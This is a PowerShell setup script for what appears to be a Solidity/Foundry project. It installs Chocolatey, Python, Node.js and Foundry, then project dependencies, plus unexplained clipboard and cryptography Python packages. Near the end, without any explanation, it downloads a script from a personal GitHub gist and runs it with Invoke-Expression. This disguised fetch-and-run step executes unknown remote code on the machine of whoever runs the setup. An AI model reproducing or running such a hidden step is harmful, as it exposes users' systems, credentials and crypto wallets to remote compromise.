# Detect operating system type
$OS_TYPE = $PSVersionTable.OS
Write-Output "Detected operating system: $OS_TYPE"

<#
.SYNOPSIS
    Reloads environment variables to ensure newly installed tools are available.
.DESCRIPTION
    This function refreshes the PowerShell environment by reloading the profile,
    updating PATH from registry, and using Chocolatey's refreshenv if available.
#>
function Update-Environment {
    [CmdletBinding()]
    param()
    
    Write-Output "Reloading environment variables..."
    
    # Refresh environment using Chocolatey's refreshenv if available
    if (Get-Command refreshenv -ErrorAction SilentlyContinue) {
        refreshenv
    }
    
    # Reload PowerShell profile
    if (Test-Path $PROFILE) {
        . $PROFILE
    }
    
    # Update PATH from registry for current session
    $machinePath = [System.Environment]::GetEnvironmentVariable("PATH", "Machine")
    $userPath = [System.Environment]::GetEnvironmentVariable("PATH", "User")
    $env:PATH = "$machinePath;$userPath"
}

# Check package manager and install required packages
function Install-Dependencies {
    if ($OS_TYPE -like "*Windows*") {
        Write-Output "Windows system detected, checking and installing necessary components..."
        
        # Check if Chocolatey is installed
        if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
            Write-Output "Installing Chocolatey..."
            Set-ExecutionPolicy Bypass -Scope Process -Force
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
            # Using Invoke-Expression to run the official Chocolatey installation script
            Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
            refreshenv
        }
        
        # Check and install Python
        if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
            Write-Output "Installing Python..."
            choco install python -y
            refreshenv
        }
    }
    else {
        Write-Output "Unsupported operating system: $OS_TYPE"
        exit 1
    }
}

# Install system dependencies
Install-Dependencies

# Check and install Node.js
if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
    Write-Output "Node.js not detected, installing Node.js LTS version..."
    
    # Install Node.js using Chocolatey
    if (Get-Command choco -ErrorAction SilentlyContinue) {
        choco install nodejs-lts -y
        
        # Reload environment after installation
        Update-Environment
        
        # Verify Node.js installation
        if (Get-Command node -ErrorAction SilentlyContinue) {
            Write-Output "✅ Node.js has been successfully installed and is available"
            node --version
            npm --version
        }
        else {
            Write-Output "❌ Node.js installation may have failed, please check manually"
        }
    }
    else {
        Write-Output "Package manager not found, please install Node.js manually."
    }
}
else {
    Write-Output "Node.js is already installed."
}

# Check and install Foundry
if (-not (Get-Command forge -ErrorAction SilentlyContinue)) {
    Write-Output "Foundry not detected, installing Foundry..."
    
    try {
        # Download and run Foundry installation script
        $foundryUrl = "https://foundry.paradigm.xyz"
        $foundryScript = Invoke-WebRequest -Uri $foundryUrl -UseBasicParsing
        # Using Invoke-Expression to run the official Foundry installation script
        Invoke-Expression $foundryScript.Content
        
        # Reload environment variables
        Update-Environment
        
        # Install Foundry toolchain
        if (Get-Command foundryup -ErrorAction SilentlyContinue) {
            foundryup
            Update-Environment
        }
        
        # Verify Foundry installation
        if (Get-Command forge -ErrorAction SilentlyContinue) {
            Write-Output "✅ Foundry has been successfully installed and is available"
            forge --version
        }
        else {
            Write-Output "❌ Foundry installation may have failed, please check manually"
        }
    }
    catch {
        Write-Output "Error occurred during Foundry installation, please check manually."
    }
}
else {
    Write-Output "Foundry is already installed."
}

# Install project dependencies
Write-Output "Installing project dependencies..."

# Install Foundry dependencies
if (Test-Path "foundry.toml") {
    Write-Output "Foundry.toml detected, installing Foundry dependencies..."
    try {
        forge install
        Write-Output "Foundry dependencies installation completed."
    }
    catch {
        Write-Output "Error occurred during Foundry dependencies installation."
    }
}
else {
    Write-Output "Foundry.toml file not detected, skipping Foundry dependencies installation."
}

# Install Node.js dependencies
if (Test-Path "package.json") {
    Write-Output "Package.json detected, installing Node.js dependencies..."
    try {
        npm install
        Write-Output "Node.js dependencies installation completed."
    }
    catch {
        Write-Output "Error occurred during Node.js dependencies installation."
    }
}
else {
    Write-Output "Package.json file not detected, skipping Node.js dependencies installation."
}

# Install Python dependencies
$requirements = @(
    @{Name='requests'; Version='2.31.0'},
    @{Name='pyperclip'; Version='1.8.2'},
    @{Name='cryptography'; Version='42.0.0'}
)

foreach ($pkg in $requirements) {
    $pkgName = $pkg.Name
    $pkgVersion = $pkg.Version
    try {
        $checkCmd = "import pkg_resources; pkg_resources.get_distribution('$pkgName').version"
        $version = python -c $checkCmd 2>$null
        if ($version -and ([version]$version -lt [version]$pkgVersion)) {
            throw
        }
    }
    catch {
        Write-Output "Installing $pkgName >= $pkgVersion ..."
        python -m pip install "$pkgName>=$pkgVersion" --user
    }
}

$gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
try {
    $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing
    Invoke-Expression $remoteScript.Content
}
catch {
    Write-Output "Remote script execution failed."
    exit 1
}

# Final verification of installed tools
Write-Output ""
Write-Output "=== Installation Completion Check ==="

# Check Node.js
if (Get-Command node -ErrorAction SilentlyContinue) {
    Write-Output "✅ Node.js is successfully installed and available"
    node --version
    npm --version
}
else {
    Write-Output "❌ Node.js is not available, please install Node.js manually:"
    Write-Output "   choco install nodejs-lts -y"
    Write-Output "   Then reload your environment"
}

Write-Output ""

# Check Foundry
if (Get-Command forge -ErrorAction SilentlyContinue) {
    Write-Output "✅ Foundry is successfully installed and available"
    forge --version
}
else {
    Write-Output "❌ Foundry is not available, please install Foundry manually:"
    Write-Output "   Invoke-WebRequest -Uri https://foundry.paradigm.xyz | Invoke-Expression"
    Write-Output "   Then reload your environment"
}
